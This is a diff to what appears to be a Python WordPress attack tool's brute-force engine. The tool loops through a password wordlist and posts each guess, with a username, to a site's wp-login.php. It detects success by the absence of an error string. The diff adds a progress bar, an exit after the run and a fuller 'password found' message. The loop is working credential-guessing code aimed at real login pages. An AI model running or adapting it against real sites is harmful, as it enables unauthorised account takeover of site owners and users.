@@ -31,6 +31,9 @@ class Brute_Engine:
 					print info("User found "+ brute)
 					self.bruteforcing_pass(wordpress, brute)
 
+		# Exit after the bruteforce
+		exit()
+
 	"""
 	name        : bruteforcing_user(self, wordpress)
 	description :
@@ -56,11 +59,16 @@ class Brute_Engine:
 		print info("Starting passwords bruteforce for " + user)
 
 		with open('fuzz/wordlist.lst') as data_file:
-			data   = data_file.readlines()
+			data  = data_file.readlines()
+			size  = len(data)
 
-			for pwd in data:
-				pwd = pwd.strip()
-				data = {"log":user, "pwd":pwd}
+			for index, pwd in enumerate(data):
+				pwd     = pwd.strip()
+				data    = {"log": user, "pwd": pwd}
+				percent = int(float(index)/(size)*100)
+
+				print 'Bruteforcing - {}{}\r'.format( percent*"▓", (100-percent)*'░' ) ,
+
 				if not "The password you entered" in requests.post(wordpress.url + "wp-login.php", data=data).text:
-					print warning("Password found "+ pwd)
+					print warning("Password found for {} : {}{}".format(user,pwd, ' '*100))
 					break
